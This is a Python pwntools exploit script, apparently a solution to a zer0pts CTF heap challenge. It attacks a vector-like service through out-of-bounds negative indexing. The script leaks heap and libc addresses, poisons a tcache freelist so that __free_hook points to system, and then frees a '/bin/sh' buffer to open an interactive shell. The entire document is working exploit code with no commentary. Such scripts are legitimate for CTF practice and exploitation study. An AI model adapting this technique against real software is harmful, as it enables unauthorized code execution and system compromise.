#!/usr/bin/env python3
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall', env={ 'LD_PRELOAD': './libc.so.6' })
else:
    s = remote('pwn.ctf.zer0pts.com', 9001)

def to_i32(value):
    value = value % (1 << 32)
    if value >= 1 << 31:
        value = value - (1 << 32)
    return value

def push_back(value):
    s.sendline('1')
    s.sendline(str(to_i32(value)))
    s.recvuntil('value: ')

def pop_back():
    s.sendlineafter('>> ', '2')

def store(index, value):
    s.sendlineafter('>> ', '3')
    s.sendlineafter('index: ', str(index))
    s.sendlineafter('value: ', str(to_i32(value)))

def load(index):
    s.sendlineafter('>> ', '4')
    s.sendlineafter('index: ', str(index))
    s.recvuntil('value: ')
    return int(s.recvline(False))

def wipe():
    s.sendlineafter('>> ', '5')

libc = ELF('./libc.so.6')

for _ in range(0x10):
    push_back(0xdeadbeef)
heap_addr = (load(-9) << 32) + load(-10)
log.info('heap address: %#x' % heap_addr)

p = log.progress('Creating a big chunk')
for i in range(0x200):
    p.status(hex(i))
    push_back(0xdeadbeef)
p.success()
libc.address = (load(-0x203) << 32) + load(-0x204) - 0x1ebbe0
log.info('libc base: %#x' % libc.address)
wipe()

for _ in range(4):
    push_back(0xdeadbeef)
store(-2, 0x31)
for _ in range(9):
    push_back(0xdeadbeef)
store(-12, libc.symbols['__free_hook'] - 8)
store(-11, (libc.symbols['__free_hook'] - 8) >> 32)
store(-2, 0x41)
wipe()

for _ in range(5):
    push_back(0xdeadbeef)
store(-2, 0x41)
wipe()

push_back(u64('/bin/sh\0'))
push_back(u64('/bin/sh\0') >> 32)
push_back(libc.symbols['system'])
push_back(libc.symbols['system'] >> 32)
push_back(0xdeadbeef)

s.interactive()
